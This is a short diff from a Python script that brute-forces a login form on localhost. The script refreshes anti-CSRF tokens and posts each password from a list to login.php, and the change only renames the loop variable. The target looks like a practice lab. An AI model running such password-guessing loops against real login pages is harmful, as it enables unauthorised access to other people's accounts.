@@ -51,9 +51,9 @@ def set_request_tokens():
     data['user_token'] = get_user_token(body=response.content.decode('UTF-8'))
 
 def brute_force():
-    for i in PASSWORDS:
+    for password in PASSWORDS:
         set_request_tokens()
-        data['password'] = i
+        data['password'] = password
         response = requests.post('http://localhost/login.php', cookies=cookies, headers=headers, data=data)
         
         if 'Login failed' in response.content.decode('UTF-8'):
